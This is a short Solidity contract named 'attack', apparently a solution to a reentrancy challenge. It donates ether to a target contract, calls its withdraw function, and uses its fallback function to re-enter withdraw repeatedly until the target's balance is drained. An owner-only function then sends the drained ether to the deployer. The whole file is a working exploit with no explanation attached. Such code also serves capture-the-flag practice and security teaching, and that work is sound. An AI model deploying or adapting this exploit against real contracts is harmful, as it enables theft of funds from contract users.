// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;

}

contract attack {
    IReentrancy private victim;
    address payable private owner;
    uint private targetAmount;

    constructor(address _victim) {
        victim = IReentrancy(_victim);
        owner = payable(msg.sender);
    }

    function donateToVictim() payable public {
        targetAmount = msg.value;
        victim.donate{value: targetAmount}(address(this));
        victim.withdraw(targetAmount);
        }

    fallback() payable external {
        uint targetBalance = address(victim).balance;
        if (targetBalance >= targetAmount) {
          victim.withdraw(targetAmount);
        }
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    function withdrawAll() public onlyOwner {
        require(address(this).balance > 0, "No balance in this contract");
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Failed to withdraw");
    }

}